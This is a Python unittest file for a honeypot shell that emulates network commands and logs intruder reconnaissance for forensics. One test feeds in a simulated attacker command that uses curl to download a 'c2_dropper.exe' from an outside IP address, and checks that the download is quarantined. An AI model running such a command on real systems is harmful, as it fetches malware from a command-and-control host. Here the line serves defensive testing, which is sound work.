import sys
import os
import unittest
import shutil

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from PyQt6.QtWidgets import QApplication
from deception.forensic_tracker import get_tracker
from deception.honey_desktop import HoneyShell


class TestHoneyNetworkRecon(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.app = QApplication.instance()
        if cls.app is None:
            cls.app = QApplication(sys.argv)

    def setUp(self):
        self.sandbox_dir = os.path.join(PROJECT_ROOT, "data", "test_sandbox_network")
        self.log_dir = os.path.join(PROJECT_ROOT, "data", "test_forensics_network")
        os.makedirs(self.sandbox_dir, exist_ok=True)
        os.makedirs(self.log_dir, exist_ok=True)

        self.tracker = get_tracker()
        self.tracker.reset_session()
        self.shell = HoneyShell(self.sandbox_dir, self.log_dir)

    def tearDown(self):
        if os.path.exists(self.sandbox_dir):
            shutil.rmtree(self.sandbox_dir, ignore_errors=True)
        if os.path.exists(self.log_dir):
            shutil.rmtree(self.log_dir, ignore_errors=True)

    def test_01_ping_emulation(self):
        print("\n--- Testing HoneyShell Ping Diagnostic Emulation ---")
        self.shell.input_field.setText("ping 192.168.1.1")
        self.shell.process_command()

        console_text = self.shell.console.toPlainText()
        self.assertIn("Pinging 192.168.1.1", console_text)
        self.assertIn("Reply from 192.168.1.1", console_text)
        self.assertIn("Packets: Sent = 4, Received = 4", console_text)

        timeline = self.tracker.get_timeline()
        recon_events = [e for e in timeline if e["action_type"] == "NETWORK_RECONNAISSANCE"]
        self.assertTrue(any("ICMP_PING" in e["target"] for e in recon_events))
        print("[OK] Ping ICMP network diagnostic emulated and recorded.")

    def test_02_arp_and_route_emulation(self):
        print("\n--- Testing HoneyShell ARP and Route Table Emulation ---")
        # 1. ARP
        self.shell.input_field.setText("arp -a")
        self.shell.process_command()
        console_text = self.shell.console.toPlainText()
        self.assertIn("192.168.1.1", console_text)
        self.assertIn("f4-f5-e8-11-22-33", console_text)

        # 2. Route Print
        self.shell.input_field.setText("route print")
        self.shell.process_command()
        console_text = self.shell.console.toPlainText()
        self.assertIn("IPv4 Route Table", console_text)
        self.assertIn("Active Routes:", console_text)

        timeline = self.tracker.get_timeline()
        recon_events = [e for e in timeline if e["action_type"] == "NETWORK_RECONNAISSANCE"]
        self.assertTrue(any("ARP_CACHE_ENUM" in e["target"] for e in recon_events))
        self.assertTrue(any("ROUTING_TABLE_ENUM" in e["target"] for e in recon_events))
        print("[OK] ARP cache table and IP routing table enumeration successfully emulated.")

    def test_03_curl_c2_payload_diversion(self):
        print("\n--- Testing HoneyShell Remote C2 Download Interception & Sandbox Diversion ---")
        # Simulate intruder attempting to download a remote backdoor
        c2_command = "curl http://194.26.29.112/c2_dropper.exe -o c2_dropper.exe"
        self.shell.input_field.setText(c2_command)
        self.shell.process_command()

        # Check console shows realistic curl output
        console_text = self.shell.console.toPlainText()
        self.assertIn("% Total    % Received", console_text)

        # Verify file diverted into sandbox directory
        diverted_file = os.path.join(self.sandbox_dir, "c2_dropper.exe")
        self.assertTrue(os.path.exists(diverted_file), "Diverted payload must exist in sandbox!")

        with open(diverted_file, "r", encoding="utf-8") as f:
            content = f.read()
            self.assertIn("[QUARANTINED BY HONEYPOT DECEPTION ENGINE]", content)
            self.assertIn("194.26.29.112", content)

        # Verify directory listing in HoneyShell shows the file
        self.shell.input_field.setText("dir")
        self.shell.process_command()
        self.assertIn("c2_dropper.exe", self.shell.console.toPlainText())

        # Verify ForensicTracker recorded C2 interception
        timeline = self.tracker.get_timeline()
        c2_events = [e for e in timeline if e["action_type"] == "C2_PAYLOAD_INTERCEPTED"]
        self.assertGreaterEqual(len(c2_events), 1)
        self.assertEqual(c2_events[0]["details"]["c2_server"], "194.26.29.112")
        self.assertEqual(c2_events[0]["details"]["diverted_filename"], "c2_dropper.exe")
        print("[OK] Remote C2 payload download intercepted, quarantined to sandbox, and logged.")

    def test_04_ssh_lateral_movement_emulation(self):
        print("\n--- Testing HoneyShell SSH Lateral Movement Probe ---")
        self.shell.input_field.setText("ssh admin@10.0.1.55")
        self.shell.process_command()

        console_text = self.shell.console.toPlainText()
        self.assertIn("authenticity of host '10.0.1.55", console_text)
        self.assertIn("Connection timed out", console_text)

        timeline = self.tracker.get_timeline()
        recon_events = [e for e in timeline if e["action_type"] == "NETWORK_RECONNAISSANCE"]
        self.assertTrue(any("LATERAL_MOVEMENT_SSH" in e["target"] for e in recon_events))
        print("[OK] Lateral movement SSH probe emulated and flagged as suspicious.")

    def test_05_nslookup_and_tracert(self):
        print("\n--- Testing HoneyShell DNS & Tracert Emulation ---")
        # 1. nslookup
        self.shell.input_field.setText("nslookup internal.corp")
        self.shell.process_command()
        console_text = self.shell.console.toPlainText()
        self.assertIn("Non-authoritative answer:", console_text)
        self.assertIn("internal.corp", console_text)

        # 2. tracert
        self.shell.input_field.setText("tracert 8.8.8.8")
        self.shell.process_command()
        console_text = self.shell.console.toPlainText()
        self.assertIn("Tracing route to 8.8.8.8", console_text)
        self.assertIn("Trace complete", console_text)

        timeline = self.tracker.get_timeline()
        recon_events = [e for e in timeline if e["action_type"] == "NETWORK_RECONNAISSANCE"]
        self.assertTrue(any("DNS_QUERY" in e["target"] for e in recon_events))
        self.assertTrue(any("ROUTE_TRACE" in e["target"] for e in recon_events))
        print("[OK] DNS query and traceroute diagnostics emulated and logged.")


if __name__ == "__main__":
    unittest.main()
